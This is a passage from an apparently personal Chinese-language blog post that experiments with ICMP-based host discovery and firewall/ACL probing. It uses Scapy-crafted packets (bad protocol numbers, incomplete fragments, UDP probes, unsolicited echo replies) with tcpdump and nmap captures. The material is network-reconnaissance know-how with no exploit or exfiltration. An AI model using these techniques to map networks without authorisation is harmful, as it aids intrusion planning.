 4  10<span class="class">.0</span><span class="class">.10</span><span class="class">.1</span> (10<span class="class">.0</span><span class="class">.10</span><span class="class">.1</span>)  0<span class="class">.504</span> <span class="tag">ms</span>  0<span class="class">.534</span> <span class="tag">ms</span>  0<span class="class">.542</span> <span class="tag">ms</span>
 5  10<span class="class">.0</span><span class="class">.13</span><span class="class">.2</span> (10<span class="class">.0</span><span class="class">.13</span><span class="class">.2</span>)  4<span class="class">.714</span> <span class="tag">ms</span>  4<span class="class">.895</span> <span class="tag">ms</span>  5<span class="class">.053</span> <span class="tag">ms</span>
 6  10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> (10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span>)  0<span class="class">.477</span> <span class="tag">ms</span>  0<span class="class">.428</span> <span class="tag">ms</span>  0<span class="class">.414</span> <span class="tag">ms</span>
</code></pre><p>在wireshark中可以看的更清楚：</p>
<pre><code>Extended Security (<span class="operator">with</span> option <span class="built_in">length</span> = <span class="number">2</span> <span class="keyword">bytes</span>; should be &gt;= <span class="number">3</span>)
</code></pre><p>我们发了一个奇怪的包= =</p>
<p><a href="http://althing.cs.dartmouth.edu/local/ICMP_Scanning_v3.0.pdf" target="_blank" rel="external">ICMP Usage in Scanning</a>中详述了使用这些技术探测ACL(访问控制列表)的神奇应用。</p>
<p>接着我们试试奇葩的protocol字段：</p>
<pre><code>&gt;&gt;&gt; ip.proto=<span class="number">155</span>
&gt;&gt;&gt; ip.show()
<span class="preprocessor">###[ IP ]###</span>
  version= <span class="number">4</span>
  ihl= None
  tos= <span class="number">0x0</span>
  len= None
  id= <span class="number">1</span>
  flags= 
  frag= <span class="number">0</span>
  ttl= <span class="number">64</span>
  proto= <span class="number">155</span>
  chksum= None
  src= <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span>
  dst= <span class="number">10.3</span><span class="number">.18</span><span class="number">.231</span>
  \options\
<span class="preprocessor">###[ UDP ]###</span>
     sport= domain
     dport= domain
     len= None
     chksum= None
&gt;&gt;&gt; send(ip)
.
Sent <span class="number">1</span> packets.
</code></pre><p>产生了一个destination unreachable(protocol unreachable)的错误报文。</p>
<pre><code> ~ ⮀ <span class="tag">sudo</span> <span class="tag">tcpdump</span> <span class="tag">-i</span> <span class="tag">eth0</span> "<span class="tag">icmp</span>"
<span class="tag">tcpdump</span>: <span class="tag">verbose</span> <span class="tag">output</span> <span class="tag">suppressed</span>, <span class="tag">use</span> <span class="tag">-v</span> <span class="tag">or</span> <span class="tag">-vv</span> <span class="tag">for</span> <span class="tag">full</span> <span class="tag">protocol</span> <span class="tag">decode</span>
<span class="tag">listening</span> <span class="tag">on</span> <span class="tag">eth0</span>, <span class="tag">link-type</span> <span class="tag">EN10MB</span> (<span class="tag">Ethernet</span>), <span class="tag">capture</span> <span class="tag">size</span> 65535 <span class="tag">bytes</span>
15<span class="pseudo">:43</span><span class="pseudo">:14</span><span class="class">.737608</span> <span class="tag">IP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.231</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.231</span> <span class="tag">protocol</span> 155 <span class="tag">unreachable</span>, <span class="tag">length</span> 36
</code></pre><p>该技术可用于主机发现，用nmap也可以结合各种协议来进行ACL的探测。</p>
<pre><code>sudo nmap -sO <span class="number">10.3</span><span class="number">.18</span><span class="number">.66</span>
</code></pre><p>这是部分抓到的包：</p>
<pre><code> ~ ⮀ <span class="tag">sudo</span> <span class="tag">tcpdump</span> "<span class="tag">icmp</span>"
<span class="tag">tcpdump</span>: <span class="tag">verbose</span> <span class="tag">output</span> <span class="tag">suppressed</span>, <span class="tag">use</span> <span class="tag">-v</span> <span class="tag">or</span> <span class="tag">-vv</span> <span class="tag">for</span> <span class="tag">full</span> <span class="tag">protocol</span> <span class="tag">decode</span>
<span class="tag">listening</span> <span class="tag">on</span> <span class="tag">eth0</span>, <span class="tag">link-type</span> <span class="tag">EN10MB</span> (<span class="tag">Ethernet</span>), <span class="tag">capture</span> <span class="tag">size</span> 65535 <span class="tag">bytes</span>
15<span class="pseudo">:51</span><span class="pseudo">:15</span><span class="class">.618473</span> <span class="tag">IP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> <span class="tag">protocol</span> 15 <span class="tag">unreachable</span>, <span class="tag">length</span> 28
15<span class="pseudo">:51</span><span class="pseudo">:16</span><span class="class">.719654</span> <span class="tag">IP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> <span class="tag">protocol</span> 241 <span class="tag">unreachable</span>, <span class="tag">length</span> 28
15<span class="pseudo">:51</span><span class="pseudo">:17</span><span class="class">.820941</span> <span class="tag">IP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> <span class="tag">protocol</span> 176 <span class="tag">unreachable</span>, <span class="tag">length</span> 28
15<span class="pseudo">:51</span><span class="pseudo">:18</span><span class="class">.922155</span> <span class="tag">IP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> <span class="tag">protocol</span> 126 <span class="tag">unreachable</span>, <span class="tag">length</span> 28
15<span class="pseudo">:51</span><span class="pseudo">:19</span><span class="class">.427885</span> <span class="tag">IP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> <span class="tag">protocol</span> 184 <span class="tag">unreachable</span>, <span class="tag">length</span> 28
15<span class="pseudo">:51</span><span class="pseudo">:20</span><span class="class">.434376</span> <span class="tag">IP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> <span class="tag">protocol</span> 45 <span class="tag">unreachable</span>, <span class="tag">length</span> 28
15<span class="pseudo">:51</span><span class="pseudo">:21</span><span class="class">.455654</span> <span class="tag">IP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> <span class="tag">protocol</span> 59 <span class="tag">unreachable</span>, <span class="tag">length</span> 28
15<span class="pseudo">:51</span><span class="pseudo">:22</span><span class="class">.466907</span> <span class="tag">IP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> <span class="tag">protocol</span> 37 <span class="tag">unreachable</span>, <span class="tag">length</span> 28
15<span class="pseudo">:51</span><span class="pseudo">:23</span><span class="class">.478382</span> <span class="tag">IP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> <span class="tag">protocol</span> 233 <span class="tag">unreachable</span>, <span class="tag">length</span> 28
15<span class="pseudo">:51</span><span class="pseudo">:24</span><span class="class">.492506</span> <span class="tag">IP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> <span class="tag">protocol</span> 162 <span class="tag">unreachable</span>, <span class="tag">length</span> 28
15<span class="pseudo">:51</span><span class="pseudo">:25</span><span class="class">.531125</span> <span class="tag">IP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> <span class="tag">protocol</span> 72 <span class="tag">unreachable</span>, <span class="tag">length</span> 28
15<span class="pseudo">:51</span><span class="pseudo">:26</span><span class="class">.452325</span> <span class="tag">IP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> <span class="tag">protocol</span> 255 <span class="tag">unreachable</span>, <span class="tag">length</span> 28
15<span class="pseudo">:51</span><span class="pseudo">:27</span><span class="class">.473618</span> <span class="tag">IP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> <span class="tag">protocol</span> 58 <span class="tag">unreachable</span>, <span class="tag">length</span> 28
15<span class="pseudo">:51</span><span class="pseudo">:28</span><span class="class">.415352</span> <span class="tag">IP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> <span class="tag">protocol</span> 25 <span class="tag">unreachable</span>, <span class="tag">length</span> 28
15<span class="pseudo">:51</span><span class="pseudo">:29</span><span class="class">.435785</span> <span class="tag">IP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> <span class="tag">protocol</span> 169 <span class="tag">unreachable</span>, <span class="tag">length</span> 28
15<span class="pseudo">:51</span><span class="pseudo">:30</span><span class="class">.456992</span> <span class="tag">IP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> <span class="tag">protocol</span> 206 <span class="tag">unreachable</span>, <span class="tag">length</span> 28
15<span class="pseudo">:51</span><span class="pseudo">:31</span><span class="class">.478499</span> <span class="tag">IP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.66</span> <span class="tag">protocol</span> 28 <span class="tag">unreachable</span>, <span class="tag">length</span> 28
15<span class="pseudo">:51</span><span class="pseudo">:31</span><span class="class">.527789</span> <span class="tag">IP</span> 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span> &gt; 10<span class="class">.3</span><span class="class">.9</span><span class="class">.4</span>: <span class="tag">ICMP</span> 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span> <span class="tag">udp</span> <span class="tag">port</span> 48089 <span class="tag">unreachable</span>, <span class="tag">length</span> 72
15<span class="pseudo">:51</span><span class="pseudo">:31</span><span class="class">.527806</span> <span class="tag">IP</span> 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span> &gt; 10<span class="class">.3</span><span class="class">.9</span><span class="class">.4</span>: <span class="tag">ICMP</span> 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span> <span class="tag">udp</span> <span class="tag">port</span> 55862 <span class="tag">unreachable</span>, <span class="tag">length</span> 72
</code></pre><h2 id="ICMP_Ip_Reassembly_Time_Exceeded">ICMP Ip Reassembly Time Exceeded</h2><p>我们可以故意把发送不完整的IP分片。来探测主机，当对一个网络实行这个伎俩时，就可以探测整个网络拓扑。</p>
<pre><code><span class="prompt">&gt;&gt;</span>&gt; ip = <span class="constant">IP</span>()/<span class="constant">TCP</span>()/<span class="string">"abcdefg"</span>
<span class="prompt">&gt;&gt;</span>&gt; ip.flags=<span class="number">1</span>
<span class="prompt">&gt;&gt;</span>&gt; ip.dst=<span class="string">'10.3.18.66'</span>
<span class="prompt">&gt;&gt;</span>&gt; ip.show()
<span class="comment">###[ IP ]###</span>
  version= <span class="number">4</span>
  ihl= <span class="constant">None</span>
  tos= <span class="number">0x0</span>
  len= <span class="constant">None</span>
  id= <span class="number">1</span>
  flags= <span class="constant">MF</span>
  frag= <span class="number">0</span>
  ttl= <span class="number">64</span>
  proto= tcp
  chksum= <span class="constant">None</span>
  src= <span class="number">10.210</span>.<span class="number">96.200</span>
  dst= <span class="number">10.3</span>.<span class="number">18.66</span>
  \options\
<span class="comment">###[ TCP ]###</span>
     sport= ftp_data
     dport= http
     seq= <span class="number">0</span>
     ack= <span class="number">0</span>
     dataofs= <span class="constant">None</span>
     reserved= <span class="number">0</span>
     flags= <span class="constant">S</span>
     window= <span class="number">8192</span>
     chksum= <span class="constant">None</span>
     urgptr= <span class="number">0</span>
     options= {}
<span class="comment">###[ Raw ]###</span>
        load= <span class="string">'abcdefg'</span>
<span class="prompt">&gt;&gt;</span>&gt; send(ip)
.
<span class="constant">Sent</span> <span class="number">1</span> packets.
</code></pre><p>过了好久好久，返回一个重组分片超时IMCP错误</p>
<pre><code>~ ⮀ sudo tcpdump -i eth0 "icmp"
tcpdump: verbose output suppressed, <span class="operator"><span class="keyword">use</span> -v <span class="keyword">or</span> -vv <span class="keyword">for</span> <span class="keyword">full</span> protocol <span class="keyword">decode</span>
listening <span class="keyword">on</span> eth0, <span class="keyword">link</span>-<span class="keyword">type</span> EN10MB (Ethernet), capture <span class="keyword">size</span> <span class="number">65535</span> <span class="keyword">bytes</span>
<span class="number">16</span>:<span class="number">29</span>:<span class="number">22.186723</span> IP <span class="number">10.3</span><span class="number">.18</span><span class="number">.66</span> &gt; <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span>: ICMP ip reassembly <span class="keyword">time</span> exceeded, <span class="keyword">length</span> <span class="number">52</span></span>
</code></pre><p>不是所有主机都会对这个响应。我试了试局域网内有的设备就没反应= =。</p>
<p>但这个端口不需要打开，试试81端口(确认此台机器没有打开81端口)也是直接返回ICMP超时错误。操作系统会直接处理报文并返回错误消息。</p>
<p>我又试了试UDP：</p>
<p>不管你是不是扫描打开的端口，都返回同样的超时错误：</p>
<pre><code><span class="prompt">&gt;&gt;</span>&gt; ip[<span class="number">1</span>]=<span class="constant">UDP</span>()
<span class="prompt">&gt;&gt;</span>&gt; ip.show()
<span class="comment">###[ IP ]###</span>
  version= <span class="number">4</span>
  ihl= <span class="constant">None</span>
  tos= <span class="number">0x0</span>
  len= <span class="constant">None</span>
  id= <span class="number">1</span>
  flags= <span class="constant">MF</span>
  frag= <span class="number">0</span>
  ttl= <span class="number">64</span>
  proto= udp
  chksum= <span class="constant">None</span>
  src= <span class="number">10.210</span>.<span class="number">96.200</span>
  dst= <span class="number">10.210</span>.<span class="number">96.195</span>
  \options\
<span class="comment">###[ UDP ]###</span>
     sport= domain
     dport= domain
     len= <span class="constant">None</span>
     chksum= <span class="constant">None</span>
<span class="prompt">&gt;&gt;</span>&gt; ip[<span class="number">1</span>].dport=<span class="number">80</span>
<span class="prompt">&gt;&gt;</span>&gt; ip.dst
<span class="string">'10.210.96.195'</span>
<span class="prompt">&gt;&gt;</span>&gt; ip.dst=<span class="string">'10.3.18.66'</span>
<span class="prompt">&gt;&gt;</span>&gt; send(ip)
.
<span class="constant">Sent</span> <span class="number">1</span> packets.
<span class="prompt">&gt;&gt;</span>&gt; ip[<span class="number">1</span>].dport=<span class="number">81</span>
<span class="prompt">&gt;&gt;</span>&gt; send(ip)
.
<span class="constant">Sent</span> <span class="number">1</span> packets.

 ~ ⮀ sudo tcpdump -i eth<span class="number">0</span> <span class="string">"host 10.3.18.66"</span>   
<span class="symbol">tcpdump:</span> verbose output suppressed, use -v <span class="keyword">or</span> -vv <span class="keyword">for</span> full protocol decode
listening on eth<span class="number">0</span>, link-type <span class="constant">EN10MB</span> (<span class="constant">Ethernet</span>), capture size <span class="number">65535</span> bytes
<span class="number">16</span><span class="symbol">:</span><span class="number">46</span><span class="symbol">:</span><span class="number">46.455970</span> <span class="constant">IP</span> <span class="number">10.210</span>.<span class="number">96.200</span>.domain &gt; <span class="number">10.3</span>.<span class="number">18.66</span>.<span class="symbol">http:</span> [|domain]
<span class="number">16</span><span class="symbol">:</span><span class="number">47</span><span class="symbol">:</span><span class="number">16.455677</span> <span class="constant">IP</span> <span class="number">10.3</span>.<span class="number">18.66</span> &gt; <span class="number">10.210</span>.<span class="number">96.200</span><span class="symbol">:</span> <span class="constant">ICMP</span> ip reassembly time exceeded, length <span class="number">36</span>
<span class="number">16</span><span class="symbol">:</span><span class="number">47</span><span class="symbol">:</span><span class="number">29.237026</span> <span class="constant">IP</span> <span class="number">10.210</span>.<span class="number">96.200</span>.domain &gt; <span class="number">10.3</span>.<span class="number">18.66</span>.hosts2-<span class="symbol">ns:</span> [|domain]
<span class="number">16</span><span class="symbol">:</span><span class="number">47</span><span class="symbol">:</span><span class="number">59.236648</span> <span class="constant">IP</span> <span class="number">10.3</span>.<span class="number">18.66</span> &gt; <span class="number">10.210</span>.<span class="number">96.200</span><span class="symbol">:</span> <span class="constant">ICMP</span> ip reassembly time exceeded, length <span class="number">36</span>
</code></pre><p>这和前文提到的<a href="http://althing.cs.dartmouth.edu/local/ICMP_Scanning_v3.0.pdf" target="_blank" rel="external">ICMP Usage in Scanning</a>所说的不一样！！！！！</p>
<p>我懒得再试其它机器和封装个ICMP包的例子了。</p>
<p>好吧，还是试了试，一个没反应。一个对开放端口(22)和非开放端口(23)都返回同样值。</p>
<pre><code>&gt;&gt;&gt; ip.dst=<span class="string">'10.210.96.210'</span>
&gt;&gt;&gt; <span class="function"><span class="title">send</span><span class="params">(ip)</span></span>
.
Sent <span class="number">1</span> packets.
&gt;&gt;&gt; ip.dst=<span class="string">'10.210.96.195'</span>
&gt;&gt;&gt; ip[<span class="number">1</span>].dport=<span class="number">22</span>
&gt;&gt;&gt; <span class="function"><span class="title">send</span><span class="params">(ip)</span></span>
.
Sent <span class="number">1</span> packets.
&gt;&gt;&gt; ip[<span class="number">1</span>].dport=<span class="number">23</span>
&gt;&gt;&gt; <span class="function"><span class="title">send</span><span class="params">(ip)</span></span>
.
Sent <span class="number">1</span> packets.

<span class="number">16</span>:<span class="number">58</span>:<span class="number">25.736005</span> IP <span class="number">10.210</span>.<span class="number">96.200</span><span class="class">.ftp-data</span> &gt; <span class="number">10.210</span>.<span class="number">96.195</span><span class="class">.ssh</span>: Flags [S], seq <span class="number">0</span>, win <span class="number">8192</span>, length <span class="number">0</span>
<span class="number">16</span>:<span class="number">58</span>:<span class="number">55.765861</span> IP <span class="number">10.210</span>.<span class="number">96.195</span> &gt; <span class="number">10.210</span>.<span class="number">96.200</span>: ICMP ip reassembly <span class="tag">time</span> exceeded, length <span class="number">44</span>
<span class="number">16</span>:<span class="number">59</span>:<span class="number">15.097094</span> IP <span class="number">10.210</span>.<span class="number">96.200</span><span class="class">.ftp-data</span> &gt; <span class="number">10.210</span>.<span class="number">96.195</span><span class="class">.telnet</span>: Flags [S], seq <span class="number">0</span>, win <span class="number">8192</span>, length <span class="number">0</span>
<span class="number">16</span>:<span class="number">59</span>:<span class="number">45.171689</span> IP <span class="number">10.210</span>.<span class="number">96.195</span> &gt; <span class="number">10.210</span>.<span class="number">96.200</span>: ICMP ip reassembly <span class="tag">time</span> exceeded, length <span class="number">44</span>
</code></pre><p>和文档描述的不相同，但只要有ICMP报文返回，说明主机是打开的。(好像没什么用…)</p>
<h2 id="UDP扫描">UDP扫描</h2><p>结合各种协议和端口，探测内网拓扑。</p>
<p>比如，我们可以先用nmap ping 扫射下某网段，然后分别试着尝试协议端口。</p>
<pre><code><span class="prompt">&gt;&gt;&gt; </span>ip[<span class="number">1</span>]=UDP()
<span class="prompt">&gt;&gt;&gt; </span>ip.show()
<span class="comment">###[ IP ]###</span>
  version= <span class="number">4</span>
  ihl= <span class="keyword">None</span>
  tos= <span class="number">0x0</span>
  len= <span class="keyword">None</span>
  id= <span class="number">1</span>
  flags= 
  frag= <span class="number">0</span>
  ttl= <span class="number">64</span>
  proto= udp
  chksum= <span class="keyword">None</span>
  src= <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span>
  dst= <span class="number">10.3</span><span class="number">.18</span><span class="number">.66</span>
  \options\
<span class="comment">###[ UDP ]###</span>
     sport= domain
     dport= domain
     len= <span class="keyword">None</span>
     chksum= <span class="keyword">None</span>
<span class="prompt">&gt;&gt;&gt; </span>send(ip)
.
Sent <span class="number">1</span> packets.

 ~ ⮀ sudo nmap -sP <span class="number">10.3</span><span class="number">.18</span><span class="number">.66</span>/<span class="number">24</span> 
Nmap scan report <span class="keyword">for</span> <span class="number">10.3</span><span class="number">.18</span><span class="number">.213</span>
Host <span class="keyword">is</span> up (<span class="number">0.00052</span>s latency).
Nmap scan report <span class="keyword">for</span> <span class="number">10.3</span><span class="number">.18</span><span class="number">.231</span>
Host <span class="keyword">is</span> up (<span class="number">0.00052</span>s latency).
Nmap scan report <span class="keyword">for</span> <span class="number">10.3</span><span class="number">.18</span><span class="number">.232</span>
Host <span class="keyword">is</span> up (<span class="number">0.00038</span>s latency).

<span class="prompt">&gt;&gt;&gt; </span>ip.dst=<span class="string">'10.3.18.230'</span>
<span class="prompt">&gt;&gt;&gt; </span>send(ip)
.
Sent <span class="number">1</span> packets.
<span class="prompt">&gt;&gt;&gt; </span>ip.dst=<span class="string">'10.3.18.231'</span>
<span class="prompt">&gt;&gt;&gt; </span>send(ip)
.
Sent <span class="number">1</span> packets.
</code></pre><p>只有<code>10.3.18.231</code>这个活着的机器有返回destination unreachable(Port unreachable)报文。</p>
<pre><code> ~ ⮀ <span class="tag">sudo</span> <span class="tag">tcpdump</span> <span class="tag">-i</span> <span class="tag">eth0</span> "<span class="tag">icmp</span>"
<span class="tag">tcpdump</span>: <span class="tag">verbose</span> <span class="tag">output</span> <span class="tag">suppressed</span>, <span class="tag">use</span> <span class="tag">-v</span> <span class="tag">or</span> <span class="tag">-vv</span> <span class="tag">for</span> <span class="tag">full</span> <span class="tag">protocol</span> <span class="tag">decode</span>
<span class="tag">listening</span> <span class="tag">on</span> <span class="tag">eth0</span>, <span class="tag">link-type</span> <span class="tag">EN10MB</span> (<span class="tag">Ethernet</span>), <span class="tag">capture</span> <span class="tag">size</span> 65535 <span class="tag">bytes</span>
15<span class="pseudo">:39</span><span class="pseudo">:12</span><span class="class">.697553</span> <span class="tag">IP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.231</span> &gt; 10<span class="class">.210</span><span class="class">.96</span><span class="class">.200</span>: <span class="tag">ICMP</span> 10<span class="class">.3</span><span class="class">.18</span><span class="class">.231</span> <span class="tag">udp</span> <span class="tag">port</span> <span class="tag">domain</span> <span class="tag">unreachable</span>, <span class="tag">length</span> 36
</code></pre><h2 id="分片与MTU">分片与MTU</h2><p>我的意思是，恰巧目标网络的MTU比上一跳网络的MTU小，如果我们设置DF标志为1,同时让IP数据包的值介于两者之间，然后倒霉的内网路由器就会发回Fragmentation Needed ICMP报文。</p>
<p>该死的我没找到比我更小的MTU网段了。现在无线网没人用了？</p>
<h2 id="Inverse_Mapping">Inverse Mapping</h2><p>大多数防火墙不过滤ICMP reply。</p>
<p>假设我们的ip是<code>10.210.96.200</code>，<code>10.210.97.195</code>是存在的。而<code>10.210.97.196</code>不在线。</p>
<pre><code><span class="prompt">&gt;&gt;</span>&gt; icmp = <span class="constant">IP</span>()/<span class="constant">ICMP</span>()
<span class="prompt">&gt;&gt;</span>&gt; icmp.dst=<span class="string">'10.210.97.195'</span>
<span class="prompt">&gt;&gt;</span>&gt; icmp.show()
<span class="comment">###[ IP ]###</span>
  version= <span class="number">4</span>
  ihl= <span class="constant">None</span>
  tos= <span class="number">0x0</span>
  len= <span class="constant">None</span>
  id= <span class="number">1</span>
  flags= 
  frag= <span class="number">0</span>
  ttl= <span class="number">64</span>
  proto= icmp
  chksum= <span class="constant">None</span>
  src= <span class="number">10.210</span>.<span class="number">96.200</span>
  dst= <span class="number">10.210</span>.<span class="number">97.195</span>
  \options\
<span class="comment">###[ ICMP ]###</span>
     type= echo-reply
     code= <span class="number">0</span>
     chksum= <span class="constant">None</span>
     id= <span class="number">0x0</span>
     seq= <span class="number">0x0</span>
<span class="prompt">&gt;&gt;</span>&gt; send(icmp)
.
<span class="constant">Sent</span> <span class="number">1</span> packets.

 ~ ⮀ sudo tcpdump -i eth<span class="number">0</span> <span class="string">"host 10.210.97.195"</span>
<span class="symbol">tcpdump:</span> verbose output suppressed, use -v <span class="keyword">or</span> -vv <span class="keyword">for</span> full protocol decode
listening on eth<span class="number">0</span>, link-type <span class="constant">EN10MB</span> (<span class="constant">Ethernet</span>), capture size <span class="number">65535</span> bytes
<span class="number">22</span><span class="symbol">:</span><span class="number">51</span><span class="symbol">:</span><span class="number">47.187719</span> <span class="constant">IP</span> <span class="number">10.210</span>.<span class="number">96.200</span> &gt; <span class="number">10.210</span>.<span class="number">97.195</span><span class="symbol">:</span> <span class="constant">ICMP</span> echo reply, id <span class="number">0</span>, seq <span class="number">0</span>, length <span class="number">8</span>
<span class="number">22</span><span class="symbol">:</span><span class="number">51</span><span class="symbol">:</span><span class="number">47.188369</span> <span class="constant">IP</span> <span class="number">10.210</span>.<span class="number">97.195</span> &gt; <span class="number">10.210</span>.<span class="number">96.200</span><span class="symbol">:</span> <span class="constant">ICMP</span> <span class="number">10.210</span>.<span class="number">97.195</span> protocol <span class="number">1</span> unreachable, length <span class="number">36</span>
</code></pre><p>发现<code>10.210.97.195</code>竟然尼码响应了！！！！！！协议不可到达！！</p>
<p>不存在的ip地址则没有响应！这尼码完全和上文提到的<a href="http://althing.cs.dartmouth.edu/local/ICMP_Scanning_v3.0.pdf" target="_blank" rel="external">ICMP Usage in Scanning</a>说的相反好么！！！</p>
<pre><code><span class="prompt">&gt;&gt;</span>&gt; icmp.dst=<span class="string">'10.210.97.196'</span>
<span class="prompt">&gt;&gt;</span>&gt; send(icmp)
.
<span class="constant">Sent</span> <span class="number">1</span> packets.

~ ⮀ sudo tcpdump -i eth<span class="number">0</span> <span class="string">"host 10.210.97.196"</span>
<span class="symbol">tcpdump:</span> verbose output suppressed, use -v <span class="keyword">or</span> -vv <span class="keyword">for</span> full protocol decode
listening on eth<span class="number">0</span>, link-type <span class="constant">EN10MB</span> (<span class="constant">Ethernet</span>), capture size <span class="number">65535</span> bytes
<span class="number">22</span><span class="symbol">:</span><span class="number">56</span><span class="symbol">:</span><span class="number">15.725836</span> <span class="constant">IP</span> <span class="number">10.210</span>.<span class="number">96.200</span> &gt; <span class="number">10.210</span>.<span class="number">97.196</span><span class="symbol">:</span> <span class="constant">ICMP</span> echo reply, id <span class="number">0</span>, seq <span class="number">0</span>, length <span class="number">8</span>
</code></pre><p>不过后来找到个在线的<code>10.210.97.200</code>也不响应。</p>
<pre><code>&gt;&gt;&gt; icmp.dst=<span class="string">'10.210.97.200'</span>
&gt;&gt;&gt; <span class="built_in">send</span>(icmp)
.
Sent <span class="number">1</span> packets.

 ~ ⮀ sudo tcpdump -i eth0 <span class="string">"host 10.210.97.200"</span>
tcpdump: verbose output suppressed, use -v <span class="operator">or</span> -vv <span class="keyword">for</span> full protocol decode
listening <span class="command"><span class="keyword">on</span> <span class="title">eth0</span>, <span class="title">link-type</span> <span class="title">EN10MB</span> (<span class="title">Ethernet</span>), <span class="title">capture</span> <span class="title">size</span> <span class="title">65535</span> <span class="title">bytes</span></span>
<span class="number">22</span>:<span class="number">59</span>:<span class="number">10.235963</span> IP <span class="number">10.210</span><span class="number">.96</span><span class="number">.200</span> &gt; <span class="number">10.210</span><span class="number">.97</span><span class="number">.200</span>: ICMP echo reply, id <span class="number">0</span>, seq <span class="number">0</span>, <span class="built_in">length</span> <span class="number">8</span>

 ~ ⮀ ping <span class="number">10.210</span><span class="number">.97</span><span class="number">.200</span>
PING <span class="number">10.210</span><span class="number">.97</span><span class="number">.200</span> (<span class="number">10.210</span><span class="number">.97</span><span class="number">.200</span>) <span class="number">56</span>(<span class="number">84</span>) <span class="keyword">bytes</span> <span class="operator">of</span> data.
<span class="number">64</span> <span class="keyword">bytes</span> <span class="built_in">from</span> <span class="number">10.210</span><span class="number">.97</span><span class="number">.200</span>: icmp_seq=<span class="number">1</span> ttl=<span class="number">63</span> <span class="built_in">time</span>=<span class="number">0.520</span> ms
<span class="number">64</span> <span class="keyword">bytes</span> <span class="built_in">from</span> <span class="number">10.210</span><span class="number">.97</span><span class="number">.200</span>: icmp_seq=<span class="number">2</span> ttl=<span class="number">63</span> <span class="built_in">time</span>=<span class="number">0.559</span> ms
</code></pre><p>丧心病狂，说明路由存在ip就转发了，不存在就默默丢弃了。至于<code>10.210.97.195</code>是什么毛病会给我个协议不可达(它可能是个路由器)……<code>Who can tell me...</code></p>
